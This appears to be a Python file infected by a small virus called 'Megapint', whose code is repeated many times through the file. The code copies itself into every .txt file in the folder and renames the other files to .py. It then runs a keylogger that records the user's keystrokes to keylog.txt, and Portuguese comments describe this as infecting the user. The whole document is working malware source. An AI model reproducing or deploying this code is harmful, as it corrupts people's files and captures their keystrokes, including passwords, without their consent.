    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
    megapint.virus_start()
    print("Sucessful infection of files...\nExecuting keylogger!")

    # Keylogger code
    with Listener(on_press=megapint.on_press, on_release=megapint.on_release) as listener:
        listener.join()
#Start execution
class Megapint:
    # def decrypt_files_in_folder(self):
    # def encrypt_files_in_folder(self):
    # def get_files_in_folder(self):
    # def encrypt_file(self):
    # def decrypt_file(self):
    def __init__(self):
        self.counter = 0
        self.keys = []
        
    # Init Virus Infect

    # Este método pega no código deste script e infeta os ficheiros da pasta com extensão .txt
    # passando-os para .py
    def virus_start(self):

        virus_code = [] # lista do codigo para infetar
        this_file = sys.argv[0] # lê o nome do ficheiro "megapint.py"
        virus_file = open(this_file, "r") # abre o ficheiro "megapint.py" em modo de leitura
        lines = virus_file.readlines() # lê as linhas do ficheiro "megapint.py"
        virus_file.close() # fecha o ficheiro
        in_virus = False # valor bool que verifica se o ficheiro está infetado
        
        for line in lines:
            if(re.search("^#Start execution", line)):
                in_virus = True
            if(in_virus == True):
                virus_code.append(line)
            if(re.search("^#End", line)):
                break

        programs = glob.glob("*.txt")

        for p in programs:
            file = open(p, "r")
            program_code = file.readlines()
            file.close()
            is_infected = False
            for line in program_code:
                if(re.search("^#Start execution", line)):
                    is_infected = True
                    break

                if not is_infected:
                    new_code = []
                    new_code = program_code
                    new_code.extend(virus_code)

                file = open(p, "w")
                file.writelines(new_code)
                file.close()

        folder = os.getcwd()
        counter = 0

        for file in os.listdir(folder):
            if file == "megapint.py" or file == "README.md" or file == "infection.txt":
                continue
            else:
                counter += 1
                source = folder + "/" + file
                os.rename(source, "File_" + str(counter) + ".py")
    #End
    # End Virus

    # Init keylogger
    # Método que guarda cada tecla do user na lista de keys
    def on_press(self, key):
        self.keys.append(key)
        self.counter += 1
        print("{0} pressed".format(key))
        if self.counter >= 1:
            self.counter = 0
            self.write_file()
            self.keys = []

    # Método que escreve o ficheiro de texto com o keylog do user infetado
    def write_file(self):
        with open("keylog.txt", "a") as f:
            for key in self.keys:
                x = str(key).replace("'", "")
                if x.find("space") > 0:
                    f.write('\n')
                elif x.find("Key") == -1:
                    f.write(x)

    # Método que faz o Keylogger terminar, caso o user clique na tecla Esc
    def on_release(self, key):
        if key == Key.esc:
            return False
    # End Keylogger

if __name__ == '__main__':
    megapint = Megapint()

    # Virus code
